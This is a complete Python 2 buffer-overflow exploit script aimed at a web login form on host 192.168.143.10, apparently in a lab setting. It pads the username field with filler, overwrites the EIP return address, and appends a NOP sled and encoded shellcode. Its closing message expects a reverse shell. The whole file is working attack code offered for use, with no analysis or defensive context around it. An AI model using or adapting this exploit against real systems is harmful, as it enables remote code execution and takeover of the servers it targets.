#!/usr/bin/python
import socket
try:
	print "\nSending evil buffer..."
	shellcode = ("\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x1f\x2d\x85\xc0\x83\xee\xfc\xe2\xf4\xe3\xc5\x07\xc0\x1f\x2d"
"\xe5\x49\xfa\x1c\x45\xa4\x94\x7d\xb5\x4b\x4d\x21\x0e\x92\x0b"
"\xa6\xf7\xe8\x10\x9a\xcf\xe6\x2e\xd2\x29\xfc\x7e\x51\x87\xec"
"\x3f\xec\x4a\xcd\x1e\xea\x67\x32\x4d\x7a\x0e\x92\x0f\xa6\xcf"
"\xfc\x94\x61\x94\xb8\xfc\x65\x84\x11\x4e\xa6\xdc\xe0\x1e\xfe"
"\x0e\x89\x07\xce\xbf\x89\x94\x19\x0e\xc1\xc9\x1c\x7a\x6c\xde"
"\xe2\x88\xc1\xd8\x15\x65\xb5\xe9\x2e\xf8\x38\x24\x50\xa1\xb5"
"\xfb\x75\x0e\x98\x3b\x2c\x56\xa6\x94\x21\xce\x4b\x47\x31\x84"
"\x13\x94\x29\x0e\xc1\xcf\xa4\xc1\xe4\x3b\x76\xde\xa1\x46\x77"
"\xd4\x3f\xff\x72\xda\x9a\x94\x3f\x6e\x4d\x42\x45\xb6\xf2\x1f"
"\x2d\xed\xb7\x6c\x1f\xda\x94\x77\x61\xf2\xe6\x18\xd2\x50\x78"
"\x8f\x2c\x85\xc0\x36\xe9\xd1\x90\x77\x04\x05\xab\x1f\xd2\x50"
"\x90\x4f\x7d\xd5\x80\x4f\x6d\xd5\xa8\xf5\x22\x5a\x20\xe0\xf8"
"\x12\xaa\x1a\x45\x45\x68\x68\xa2\xed\xc2\x1f\x2c\x3e\x49\xf9"
"\x47\x95\x96\x48\x45\x1c\x65\x6b\x4c\x7a\x15\x9a\xed\xf1\xcc"
"\xe0\x63\x8d\xb5\xf3\x45\x75\x75\xbd\x7b\x7a\x15\x77\x4e\xe8"
"\xa4\x1f\xa4\x66\x97\x48\x7a\xb4\x36\x75\x3f\xdc\x96\xfd\xd0"
"\xe3\x07\x5b\x09\xb9\xc1\x1e\xa0\xc1\xe4\x0f\xeb\x85\x84\x4b"
"\x7d\xd3\x96\x49\x6b\xd3\x8e\x49\x7b\xd6\x96\x77\x54\x49\xff"
"\x99\xd2\x50\x49\xff\x63\xd3\x86\xe0\x1d\xed\xc8\x98\x30\xe5"
"\x3f\xca\x96\x65\xdd\x35\x27\xed\x66\x8a\x90\x18\x3f\xca\x11"
"\x83\xbc\x15\xad\x7e\x20\x6a\x28\x3e\x87\x0c\x5f\xea\xaa\x1f"
"\x7e\x7a\x15")
	filler = "A" * 780
	eip = "\x83\x0c\x09\x10"
	offset = "C" * 4
	nops = "\x90" * 10
	inputBuffer = filler + eip + offset + nops + shellcode

	content = "username=" + inputBuffer + "&password=A"
	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "Host: 192.168.143.10\r\n"
	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"

	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Referer: http://192.168.143.10/login\r\n"
	buffer += "Connection: close\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "\r\n"

	buffer += content
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.143.10", 80))
	s.send(buffer)

	s.close()

	print "\nDone did you get a reverse shell?"

except:
	print "\nCould not connect!"
